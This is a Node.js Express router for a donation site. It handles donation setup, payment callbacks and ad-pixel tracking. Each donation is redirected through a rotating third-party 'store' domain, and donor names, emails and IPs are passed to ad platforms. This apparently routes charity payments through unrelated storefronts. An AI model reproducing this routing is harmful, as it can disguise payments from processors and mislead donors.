const express = require('express');
const crypto = require('crypto');

function normalizeHost(host) {
  if (!host) return '';
  return host.toLowerCase().replace(/^www\./, '').split(':')[0];
}

function getAllowedHosts(req) {
  const envList = (process.env.ALLOWED_CAMPAIGN_HOSTS || '')
    .split(',').map(h => normalizeHost(h.trim())).filter(Boolean);
  const selfHost = normalizeHost(req.get('host') || '');
  if (selfHost) envList.push(selfHost);
  return new Set(envList);
}

function hostMatches(sourceUrl, req) {
  if (!sourceUrl) return true;
  try {
    const srcHost = normalizeHost(new URL(sourceUrl).host);
    const allowed = getAllowedHosts(req);
    return allowed.has(srcHost);
  } catch (_) {
    return false;
  }
}

module.exports = function createDonationRouter(ctx) {
  const router = express.Router();
  const {
    ACTIVE_CAMPAIGN,
    ACTIVE_CURRENCY,
    CALLBACK_SECRET,
    JourneyLog,
    fmtCurrency,
    getOrCreateVisitor,
    getClientInfo,
    isTrackingEnabled,
    getTrackingConfig,
    trackEvent,
    trackPurchase,
    getNextStore,
    createDonationToken,
    loadCampaignFromFile
  } = ctx;

  router.post('/api/init-donation', async (req, res) => {
    const clientInfo = getClientInfo(req);
    const { amount, tip = 0, isAnonymous = false, donorEmail = null, tracking = null, clientLocation = null } = req.body;

    try {
      if (!amount || amount < 0.50) {
        return res.status(400).json({ error: 'Invalid donation amount' });
      }

      const store = await getNextStore();
      if (!store) {
        return res.status(503).json({ error: 'No active stores available' });
      }

      const token = crypto.randomBytes(32).toString('hex');
      const expiresAt = new Date(Date.now() + 5 * 60 * 1000).toISOString();

      const campaign = loadCampaignFromFile(ACTIVE_CAMPAIGN);
      const campaignHost = req.get('host') || '';
      const campaignProto = req.protocol || 'https';
      const campaignOrigin = `${campaignProto}://${campaignHost}`;
      const rawImage = campaign?.images?.[0]?.thumb || campaign?.images?.[0]?.url || null;
      const absoluteImage = rawImage && rawImage.startsWith('/') ? `${campaignOrigin}${rawImage}` : rawImage;

      const campaignDisplay = campaign ? {
        title: campaign.title,
        organizer: campaign.organizer?.name,
        image: absoluteImage,
        beneficiary: (campaign.title || '').replace(/^(Help|Aidez|Ajude|Aiuta|Pomóż|Ayuda)\s+/i, '').split(/\s+(Fight|à|a|contro|walczyć|luchar)/i)[0].trim()
      } : {};

      const pixelConfig = getTrackingConfig();
      const enrichedTracking = {
        ...(tracking || {}),
        campaignDisplay,
        metaPixelId: pixelConfig.fbPixelId || null,
        tiktokPixelId: pixelConfig.tiktokPixelId || null,
        clientLocation: clientLocation || clientInfo.clientLocation || null,
        campaignOrigin
      };

      await createDonationToken({
        token,
        amount: parseFloat(amount),
        currency: ACTIVE_CURRENCY.code,
        campaignSlug: ACTIVE_CAMPAIGN,
        storeId: store.id,
        language: ctx.DEFAULT_LANGUAGE,
        tipAmount: parseFloat(tip),
        isAnonymous,
        donorEmail,
        tracking: enrichedTracking,
        ipAddress: clientInfo.ipAddress,
        userAgent: clientInfo.userAgent,
        expiresAt
      });

      const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, enrichedTracking.clientLocation);
      JourneyLog.paymentEvent(visitor, 'redirect_initiated', `${fmtCurrency(amount)} → ${store.domain}`);

      const storeBase = process.env.DEV_STORE_URL || `https://${store.domain}`;
      const redirectUrl = `${storeBase}/s/${token}`;
      res.json({ redirectUrl });
    } catch (error) {
      console.error('Init donation error:', error);
      res.status(500).json({ error: 'Failed to initialize donation' });
    }
  });

  router.post('/api/payment-callback', async (req, res) => {
    const { secret, tokenId, paymentData } = req.body;

    if (secret !== CALLBACK_SECRET) {
      console.warn(`[payment-callback] 403 secret mismatch tokenId=${tokenId} from=${req.ip} amount=${paymentData?.amount} store=${paymentData?.storeDomain}`);
      return res.status(403).json({ error: 'Invalid callback secret' });
    }

    res.json({ success: true });

    setImmediate(async () => {
      try {
        if (!isTrackingEnabled() || !paymentData) return;

        const tracking = paymentData.tracking || {};
        const sourceUrl = tracking.sourceUrl || '';

        if (!hostMatches(sourceUrl, req)) {
          console.warn(`[payment-callback] Skipping CAPI: sourceUrl host mismatch (src=${sourceUrl}, self=${req.get('host')})`);
          const { visitor } = getOrCreateVisitor(paymentData?.ipAddress || 'unknown', tracking.clientLocation || null);
          JourneyLog.purchase(
            visitor,
            paymentData?.amount || 0,
            paymentData?.storeDomain || 'unknown',
            { meta: 'SKIP(host)', tiktok: 'SKIP(host)' }
          );
          return;
        }

        if (!tracking.eventId) {
          console.error(`[payment-callback] Missing tracking.eventId for token ${tokenId}; CAPI Purchase skipped to avoid dedup break.`);
          const { visitor } = getOrCreateVisitor(paymentData?.ipAddress || 'unknown', tracking.clientLocation || null);
          JourneyLog.purchase(
            visitor,
            paymentData?.amount || 0,
            paymentData?.storeDomain || 'unknown',
            { meta: 'SKIP(no-eid)', tiktok: 'SKIP(no-eid)' }
          );
          return;
        }

        const clientInfo = {
          ipAddress: paymentData.ipAddress || 'unknown',
          userAgent: paymentData.userAgent || 'unknown',
          clientLocation: tracking.clientLocation || null
        };

        const trackingData = {
          eventId: tracking.eventId,
          sourceUrl,
          fbp: tracking.fbp || null,
          fbc: tracking.fbc || null,
          ttp: tracking.ttp || null,
          ttclid: tracking.ttclid || null
        };

        let capiResult = { meta: '-', tiktok: '-' };
        try {
          capiResult = await trackPurchase({
            amount: paymentData.amount,
            currency: paymentData.currency,
            donationType: 'one-time',
            captureId: paymentData.stripeChargeId,
            cardHolderName: paymentData.cardHolderName,
            donorNameReal: paymentData.donorNameReal,
            donorEmail: paymentData.donorEmail,
            customerId: paymentData.customerId
          }, trackingData, clientInfo);
        } catch (err) {
          console.error('CAPI tracking error (non-critical):', err.message);
        }

        const { visitor } = getOrCreateVisitor(paymentData?.ipAddress || 'unknown', tracking.clientLocation || null);
        JourneyLog.purchase(
          visitor,
          paymentData?.amount || 0,
          paymentData?.storeDomain || 'unknown',
          capiResult
        );
      } catch (error) {
        console.error('Payment callback async error:', error);
      }
    });
  });

  router.post('/api/track', async (req, res) => {
    if (!isTrackingEnabled()) {
      return res.json({ success: true, message: 'Tracking not configured' });
    }

    const { event, eventId, sourceUrl, cookies, clientLocation, data, storeProxy } = req.body;

    const isTrustedStore = storeProxy && storeProxy.secret === CALLBACK_SECRET;

    const defaultClientInfo = getClientInfo(req);
    const clientInfo = isTrustedStore
      ? {
          ipAddress: storeProxy.ipAddress || defaultClientInfo.ipAddress,
          userAgent: storeProxy.userAgent || defaultClientInfo.userAgent,
          referer: defaultClientInfo.referer,
          clientLocation: clientLocation || defaultClientInfo.clientLocation
        }
      : defaultClientInfo;

    if (!isTrustedStore && !hostMatches(sourceUrl, req)) {
      console.warn(`[/api/track] Cross-host event rejected: ${event} src=${sourceUrl} self=${req.get('host')}`);
      return res.status(403).json({ success: false, error: 'Host mismatch' });
    }

    const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, clientInfo.clientLocation);

    const userData = {
      email: isTrustedStore ? (storeProxy.email || null) : null,
      emailHash: data?.emailHash || null,
      fbp: cookies?.fbp || null,
      fbc: cookies?.fbc || null,
      ttp: cookies?.ttp || null,
      ttclid: cookies?.ttclid || null,
      externalId: null
    };

    const resolvedSourceUrl = sourceUrl || `${req.protocol}://${req.get('host')}/`;

    const eventData = {
      eventId,
      sourceUrl: resolvedSourceUrl,
      value: data?.value,
      currency: data?.currency || ACTIVE_CURRENCY.code,
      contentName: data?.contentName,
      contentType: data?.contentType
    };

    try {
      if (event === 'PageView') {
        await trackEvent(event, eventData, userData, clientInfo);
        return res.json({ success: true });
      }

      const capiStatus = await trackEvent(event, eventData, userData, clientInfo);

      if (event === 'ViewContent') {
        let pathname = '/';
        try { pathname = new URL(resolvedSourceUrl).pathname; } catch (_) {}
        JourneyLog.newVisitor(visitor, pathname, capiStatus);
      } else {
        const eventMessages = {
          'AddToCart': 'Opened donation modal',
          'InitiateCheckout': `Started checkout (${fmtCurrency(data?.value || '?')})`,
          'AddPaymentInfo': 'Entering payment details',
          'Purchase': 'Completed donation'
        };
        JourneyLog.event(visitor, event, eventMessages[event] || event, capiStatus);
      }

      res.json({ success: true });
    } catch (error) {
      res.json({ success: false, error: error.message });
    }
  });

  router.post('/api/track/payment-event', (req, res) => {
    const clientInfo = getClientInfo(req);
    const { eventType, details, amount, paymentMethod, clientLocation } = req.body;

    const { visitor } = getOrCreateVisitor(clientInfo.ipAddress, clientLocation);

    let detailStr = details || '';
    if (amount) {
      detailStr = `${fmtCurrency(amount)}${paymentMethod ? ` via ${paymentMethod}` : ''}${details ? ` - ${details}` : ''}`;
    }

    JourneyLog.paymentEvent(visitor, eventType, detailStr);
    res.json({ success: true });
  });

  return router;
};
